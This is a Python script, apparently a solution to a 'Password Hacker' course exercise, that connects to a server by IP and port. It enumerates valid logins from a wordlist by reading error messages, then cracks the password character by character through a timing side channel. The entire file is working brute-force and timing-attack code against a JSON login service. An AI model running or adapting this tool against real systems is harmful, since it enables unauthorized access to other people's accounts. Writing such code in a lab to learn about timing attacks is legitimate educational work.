import socket
import argparse
import json
from time import perf_counter
from string import ascii_letters
from string import digits

# Create argument parser with positional arguments
parser = argparse.ArgumentParser()
parser.add_argument("ip", type=str)
parser.add_argument("port", type=int)
args = parser.parse_args()

address = (args.ip, args.port)
buffer_size = 1024

# create array of dictionaries of logins
# and empty passwords
logins = []
with open("D:\\projects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt") as l:
    for line in l:
        dic = {"login": line.rstrip("\n"), "password": ""}
        logins.append(dic)

login, password = "", ""

with socket.socket() as client_socket:
    client_socket.connect(address)

    # find the correct login
    response = ""
    for log in logins:
        client_socket.send(json.dumps(log).encode())
        response = client_socket.recv(buffer_size).decode()
        response = json.loads(response)["result"]
        if response == "Wrong password!":
            login = log["login"]
            break

    # check password with each added character
    # until connection success
    while response != "Connection success!":
        for symbol in ascii_letters + digits:
            request = {"login": login, "password": password + symbol}

            client_socket.send(json.dumps(request).encode())
            start = perf_counter()
            response = client_socket.recv(buffer_size).decode()
            end = perf_counter()
            response = json.loads(response)["result"]
            if end - start > 0.1 or \
                response == "Connection success!":
                password += symbol
                break

print(json.dumps({"login": login, "password": password}, indent=4))